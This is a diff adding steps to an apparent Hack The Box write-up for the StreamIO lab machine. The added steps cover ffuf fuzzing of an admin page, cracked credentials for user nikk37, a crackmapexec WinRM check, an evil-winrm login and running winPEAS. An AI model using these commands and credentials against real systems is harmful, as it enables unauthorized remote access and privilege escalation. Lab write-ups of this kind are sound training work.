@@ -52,3 +52,41 @@ https://streamio.htb/login.php
 
 yoshihide | 66boysandgirls..
 ![image](https://user-images.githubusercontent.com/33616880/231684191-deebb280-68bc-4a64-925e-27d2ae57c876.png)
+
+
+
+![image](https://user-images.githubusercontent.com/33616880/231685199-5f8f77ea-2941-4e43-b790-ad255a05b590.png)
+
+
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -fs 1678
+![image](https://user-images.githubusercontent.com/33616880/231685748-72927c4a-a4d4-4c78-b3cd-1f1b79687378.png)
+
+
+![image](https://user-images.githubusercontent.com/33616880/231685826-403dd7d3-9fbf-4633-9a0d-eadc14d8a6bd.png)
+
+
+
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/FUZZ' -b PHPSESSID=uuvl3he49lki4offn75s78p6m4 -e .php
+![image](https://user-images.githubusercontent.com/33616880/231685928-48a47caa-43a2-4427-bf94-e1b796dd2339.png)
+
+
+![image](https://user-images.githubusercontent.com/33616880/231686014-782672f5-2cd5-4701-ae65-e2c0a17b50a7.png)
+
+
+
+crackmapexec winrm streamio.htb -u nikk37 -p 'get_dem_girls2@yahoo.com'
+![image](https://user-images.githubusercontent.com/33616880/231686173-feab63d2-f0eb-4ace-8ffa-75df669cec01.png)
+
+
+
+evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
+![image](https://user-images.githubusercontent.com/33616880/231686295-621f2f18-be32-4e7e-90af-b0dada0b1254.png)
+
+```
+upload winPEASx64.exe
+./winPEASx64.exe
+```
+![image](https://user-images.githubusercontent.com/33616880/231686514-0c6ced70-5cf4-48e3-8951-6b9ba81b18e0.png)
+![image](https://user-images.githubusercontent.com/33616880/231686548-aa5a6439-c37c-4f74-a300-568f7ac4193a.png)
+![image](https://user-images.githubusercontent.com/33616880/231686573-5ded1f6d-582b-41dd-adbd-30e8fa3f7b43.png)
